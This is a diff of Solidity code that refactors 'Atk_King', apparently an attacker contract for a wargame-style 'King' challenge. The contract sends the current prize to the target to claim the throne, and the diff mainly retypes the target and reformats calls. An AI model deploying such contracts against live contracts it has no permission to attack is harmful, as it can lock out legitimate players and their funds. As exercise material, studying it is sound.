@@ -28,24 +28,21 @@ contract King {
 contract Atk_King {
     address public owner;
     uint public amount;
-    address public target;
+    King public target;
 
     constructor(address addr) payable {
         owner = msg.sender;
-        target = addr;
+        target = King(payable(addr));
     }
 
-    function set_target(address addr) public {
-        target = addr;
-    }
 
-    function get_prize() public view returns(uint){
-        uint prize = King(payable(target)).prize();
+    function get_prize() public view returns (uint){
+        uint prize = target.prize();
         return prize;
     }
 
     function withdraw() public {
-        (bool sent,) = owner.call{value:address(this).balance}("");
+        (bool sent,) = owner.call{value : address(this).balance}("");
     }
 
     function add_fund() payable public {
@@ -53,7 +50,7 @@ contract Atk_King {
     }
 
     function atk(uint prize) public {
-        (bool sent,) = target.call{value:prize}("");
+        (bool sent,) = address(target).call{value : prize}("");
     }
 
 
